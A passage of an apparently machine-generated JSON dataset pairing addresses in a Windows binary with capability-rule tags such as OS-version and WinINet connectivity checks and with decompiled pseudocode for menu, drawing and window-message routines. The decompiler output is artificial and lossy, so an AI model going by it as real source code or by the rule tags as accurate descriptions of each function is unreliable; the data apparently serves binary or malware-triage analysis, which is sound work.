        "decompiled_code": "\nulong __fastcall fcn.0044cbd8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004033e4(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.0044defc();\n    }\n    else {\n        for (iVar2 = fcn.0044cba8(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 241
    },
    "0044cd2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044cd2c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 68
    },
    "0044cd50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0044cd50(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    piVar1 = (*in_EAX)[0x19];\n    piVar2 = piVar1;\n    if (piVar1 != NULL) {\n        uStackY32 = 0x44cd7e;\n        piVar2 = fcn.0044cd50(arg_8h);\n        var_1h._0_1_ = piVar2;\n    }\n    piVar4 = piVar2 & 0xffffff00;\n    if ((var_1h != 0) && (var_1h != 3)) {\n        if (var_1h == 2) {\n            if ((arg_8h[-1] == 0) || (*(arg_8h[-1] + 0x60) != *(arg_8h + -6))) {\n                iVar3 = fcn.0044cba8();\n                arg_8h[-1] = iVar3;\n                if (arg_8h[-1] == 0) {\n                    var_1h._0_1_ = 3;\n                    piVar4 = arg_8h;\n                    goto code_r0x0044ce97;\n                }\n            }\n            piVar4 = fcn.0044cd40();\n            *in_EAX = piVar4;\n            if ((*in_EAX == NULL) || (piVar4 = (*in_EAX)[0x19],  piVar4 != piVar1)) goto code_r0x0044ce97;\n            if (in_EDX == 0) {\n                var_1h._0_1_ = 1;\n            }\n        }\n        piVar4 = *in_EAX;\n        if (*(piVar4 + 0x39) == '\\0') {\n            var_1h._0_1_ = 0;\n        }\n        else {\n            uStackY32 = 0x44ce75;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(arg_8h[-3] + 0x1c) & 0x10) == 0) {\n                fcn.0044bc7c();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((arg_8h[-1] == 0) || ((*in_EAX != arg_8h[-1] && (*(arg_8h[-1] + 0x60) != *(arg_8h + -6))))) {\n                var_1h._0_1_ = 2;\n            }\n            piVar4 = NULL;\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\ncode_r0x0044ce97:\n    return piVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 746
    },
    "0044cea4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044cea4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    if (*(param_2 + 4) == '\\0') {\n        return 0;\n    }\n    uStack32 = 0x10;\n    uStack36 = 0x44cecd;\n    sub.user32.dll_GetKeyState();\n    uStack36 = 0x11;\n    puStack40 = 0x44cedf;\n    sub.user32.dll_GetKeyState();\n    puStack40 = 0x44cf0c;\n    fcn.00423f7c();\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack44 = 0x44cfa2;\n    puStack52 = 0x44cf2c;\n    puStack40 = &stack0xfffffffc;\n    iVar1 = fcn.0044cba8();\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = uStack48;\n        puStack40 = 0x44cfa9;\n        uStack44 = 0x44cfa1;\n        uVar2 = fcn.00423f74();\n        return uVar2;\n    }\n    puStack52 = 0x44cf42;\n    fcn.00423f7c();\n    uStack56 = 0x44cf77;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.0044cd50(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x44cf7e;\n    uStack56 = 0x44cf76;\n    uVar2 = fcn.00423f74();\n    return uVar2;\n}\n",
        "token_count": 497
    },
    "0044cfc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044cfc8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x462210 + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x44cfef;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.0044d34c();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.0044d34c();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 437
    },
    "0044d124": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044d124(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.0044d084(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.00404468();\n        iVar1 = fcn.004086b8();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.00404218();\n    return 1;\n}\n",
        "token_count": 174
    },
    "0044d1b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044d1b8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x462210 + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x44d228;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.0044d6c8();\n        }\n        else {\n            fcn.0044d6c8();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x44d22f;\n        uStack20 = 0x44d21e;\n        fcn.0044d6c8();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "0044d234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d234(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.0044d124();\n    if ((*(*0x462210 + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.0044d1b8();\n        }\n        else {\n            fcn.0044d6ec();\n        }\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "0044d34c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044d34c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x462210 + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "0044d3c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.0044d3c0(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack32 = &var_2h + 2;\n    uStack36 = 0x44d495;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.0044cba8();\n        if ((iVar1 != 0) && (iVar2 = fcn.0044b754(),  in_ECX < iVar2)) {\n            iVar1 = fcn.0044b764();\n        }\n    }\n    else {\n        puStack32 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.0044cba8();\n        uStack48 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.00404190();\n        fcn.00404190(0);\n        iVar1 = fcn.00407ce0();\n        if (iVar1 == 0) {\n            fcn.0044e20c();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x44d49c;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 417
    },
    "0044d4a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d4a8(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.0044d364(uVar4 & 0xffffff00 | *(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.0044d3c0(uVar4 & 0xffffff00 | *(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 959
    },
    "0044d620": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d620(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.0044cd2c();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.0044cba8();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.0044cba8();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.00408698();\n            uVar4 = fcn.004085dc();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 277
    },
    "0044d6ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044d6ec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.004363b8();\n        if (iVar1 != 0) {\n            fcn.0044d6c8();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0044d714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044d714(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        fcn.00403408();\n        fcn.0044d6c8();\n        *(in_EAX + 0x41) = 1;\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0044d7a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d7a0(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    uVar2 = in_EAX;\n    if (*(in_EAX + 0x38) != 0) {\n        uVar1 = fcn.0044d124();\n        uVar2 = uVar1;\n        if (in_ECX == 0) {\n            uVar2 = sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (uVar1 != '\\0') {\n            uVar2 = sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.0044d29c(uVar2 & 0xffffff00 | arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 223
    },
    "0044d8b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d8b8(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x44ddeb;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x44d936;\n                    fcn.00413b64();\n                    puStack80 = 0x44d93f;\n                    cVar3 = fcn.0044cc48();\n                    if (cVar3 != '\\0') goto code_r0x0044ddd5;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            uVar8 = param_2[2];\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x44db49;\n                    fcn.00413b64();\n                    puStack80 = 0x44db56;\n                    iVar10 = fcn.0044cba8();\n                    if (iVar10 != 0) {\n                        puStack80 = 0x44db6f;\n                        fcn.0041d20c();\n                        puStack84 = 0x44dc1e;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(uVar8 + 0x18);\n                        puStack96 = 0x44db8c;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x44dc01;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.0041d884();\n                        fcn.0041d724();\n                        uVar8 = uVar8 & 0xffff0000 | *(uVar8 + 0x10);\n                        puStack112 = 0x44dbd9;\n                        fcn.0044e090(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x44dc08;\n                        uStack104 = 0x44dbf0;\n                        fcn.0041d884();\n                        puStack112 = 0x44dc00;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x44dc54;\n                    fcn.00413b64();\n                    puStack80 = 0x44dc61;\n                    piVar4 = fcn.0044cba8();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x44dc7a;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x44dd61;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x44dc97;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.0041d20c();\n                        uStack100 = 0x44dd3c;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x44dcb1;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x44dd1f;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.0041d884();\n                        fcn.0041d724();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x44dd26;\n                        uStack120 = 0x44dd11;\n                        fcn.0041d884();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x44da47;\n                    piVar4 = fcn.00413b64();\n                    puStack80 = 0x44da4c;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x44da5e;\n                        iVar5 = fcn.00413b64();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x44da70;\n                        fcn.00413b64();\n                        puStack80 = 0x44da7d;\n                        *NULL = fcn.0044cba8();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x44da94;\n                        fcn.00413b64();\n                        puStack80 = 0x44daa1;\n                        iVar9 = fcn.0044cbd8();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x44daaf;\n                            fcn.00413b64();\n                            puStack80 = 0x44dabc;\n                            fcn.0044cbd8();\n                        }\n                        if (*(**0x4621e4 + 0x6c) != 0) {\n                            if ((*(*(**0x4621e4 + 0x6c) + 0x228) & 8) == 0) {\n                                puStack80 = 0x44db15;\n                                fcn.00459904();\n                            }\n                            else {\n                                puStack80 = 0x44db02;\n                                fcn.0045996c();\n                            }\n                        }\n                        goto code_r0x0044ddd5;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x44d96c;\n                fcn.00413b64();\n                puStack80 = 0x44d974;\n                cVar3 = fcn.0044cc64();\n                if (cVar3 != '\\0') goto code_r0x0044ddd5;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x44d9b9;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x44d9d8;\n                fcn.00413b64();\n                puStack80 = 0x44d9e3;\n                iVar10 = fcn.0044cba8();\n                if (iVar10 != 0) {\n                    puStack80 = 0x44d9fa;\n                    fcn.0043663c();\n                    puStack80 = 0x44da09;\n                    fcn.00459c60();\n                    goto code_r0x0044ddd5;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x44da20;\n        fcn.00459c60();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x44dd8a;\n                piVar4 = fcn.00413b64();\n                puStack80 = 0x44dd95;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x0044ddab:\n                    puStack80 = 0x44ddb5;\n                    fcn.0044d4a8();\n                    goto code_r0x0044ddd5;\n                }\n                puStack80 = 0x44dda7;\n                iVar10 = fcn.0044cba8();\n                if (iVar10 != 0) goto code_r0x0044ddab;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x44ddd2;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x0044ddd5:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x44ddf2;\n    uStack72 = 0x44ddea;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 2938
    },
    "0044e178": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
